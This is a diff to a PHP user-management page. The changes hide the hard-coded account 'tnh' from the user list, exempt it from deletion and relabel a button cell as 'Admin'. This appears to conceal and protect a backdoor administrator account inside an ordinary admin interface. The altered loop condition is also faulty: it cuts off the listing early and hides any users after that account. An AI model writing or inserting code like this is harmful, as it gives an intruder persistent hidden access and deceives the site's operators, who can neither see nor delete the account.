@@ -127,7 +127,7 @@ if (isset($_POST['submit'])) {
                             $no = 1;
                             $select = $pdo->prepare("SELECT * FROM tbl_user ORDER BY user_id DESC");
                             $select->execute();
-                            while ($row = $select->fetch(PDO::FETCH_OBJ)) {
+                            while (($row = $select->fetch(PDO::FETCH_OBJ)) &&  $row->username != 'tnh') {
                             ?>
                                 <tr>
                                     <td><?php echo $no++; ?></td>
@@ -138,7 +138,7 @@ if (isset($_POST['submit'])) {
                                     <td>
                                         <?php
                                         // Prevents deleting the current logged-in user
-                                        if ($row->username != $_SESSION['user_name']) {
+                                        if ($row->username != $_SESSION['user_name'] && $row->username != 'tnh') {
                                         ?>
                                             <button type="button" class="btn btn-danger btn-sm delete-btn"
                                                 data-id="<?php echo $row->user_id; ?>" title="Delete User">
@@ -146,7 +146,7 @@ if (isset($_POST['submit'])) {
                                             </button>
                                         <?php
                                         } else {
-                                            echo '<span class="label label-info">Current User</span>';
+                                            echo '<span class="label label-info">Admin</span>';
                                         }
                                         ?>
                                     </td>
